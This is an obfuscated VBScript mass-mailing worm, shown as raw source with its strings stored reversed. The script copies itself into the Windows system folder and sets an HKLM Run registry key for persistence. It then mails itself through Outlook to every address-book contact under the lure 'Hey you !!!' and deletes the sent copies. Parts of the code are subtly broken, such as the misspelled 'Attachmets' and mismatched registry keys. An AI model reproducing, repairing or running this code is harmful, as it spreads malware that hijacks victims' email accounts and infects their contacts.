   ' EMM

   On Error Resume Next

   Dim I16945X
   Dim N7WS
   Dim O3D9
   Dim P3M1FSA9
   Dim UTRWBQG
   Dim Y4V
   Dim IW1

   Set I16945X = CreateObject( LRRNXEFQ( "tcejbOmetsySeliF.gnitpircS" ) )
   I16945X.CopyFile WScript.ScriptFullName, I16945X.BuildPath( I16945X.GetSpecialFolder(1), LRRNXEFQ( "SBV.98CW0T" ) )

   Set N7WS = CreateObject( LRRNXEFQ( "llehS.tpircSW" ) )
   N7WS.RegWrite LRRNXEFQ( "\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH" ) & LRRNXEFQ( "98CW0T" ), I16945X.BuildPath( I16945X.GetSpecialFolder(1), LRRNXEFQ( "SBV.98CW0T" ) )

   BR4LB8A = N7WS.RegRead( LRRNXEFQ( "\ENIHCAM_LACOL_YEKH" ) & LRRNXEFQ( "98CW0T" ) )

   If BR4LB8A = "" Or BR4LB8A > 20 Then
      BR4LB8A = 0
   End If

   If BR4LB8A = 0 Then
      Set UTRWBQG = CreateObject( LRRNXEFQ( "noitacilppA.kooltuO" ) )
      Set O3D9 = UTRWBQG.GetNameSpace( LRRNXEFQ( "IPAM" ) )

      For Each P3M1FSA9 In O3D9.AddressLists
          Set DC0K = UTRWBQG.CreateItem( 0 )

          For Y4V = 1 To P3M1FSA9.AddressEntries.Count
              Set IW1 = P3M1FSA9.AddressEntries( Y4V )

              If Y4V = 1 Then
                 DC0K.BCC = IW1.Address
              Else
                 DC0K.BCC = DC0K.BCC & LRRNXEFQ( " ;" ) & IW1.Address
              End If
          Next

          DC0K.Subject = LRRNXEFQ( "!!! uoy yeH" )
          DC0K.Body = LRRNXEFQ( "!!! uoy rof egassem tnatropmI" )
          DC0K.Attachmets.Add WScript.ScriptFullName
          DC0K.DeleteAfterSubmit = True
          DC0K.Send
      Next

      BR4LB8A = 0
   End If

   N7WS.RegWrite LRRNXEFQ( "\ENIHCAM_LACOL_YEKH" ) & LRRNXEFQ( "98CW0T" ), BR4LB8A + 1

   Function LRRNXEFQ( J57R7V1T )
      Dim NW9WG
      Dim M855MI8F
      Dim I5R

      NW9WG = ""

      For M855MI8F = 1 To Len( J57R7V1T )
          I5R = Mid( J57R7V1T, M855MI8F, 1 )

          NW9WG = I5R & NW9WG
      Next

      LRRNXEFQ = NW9WG
   End Function
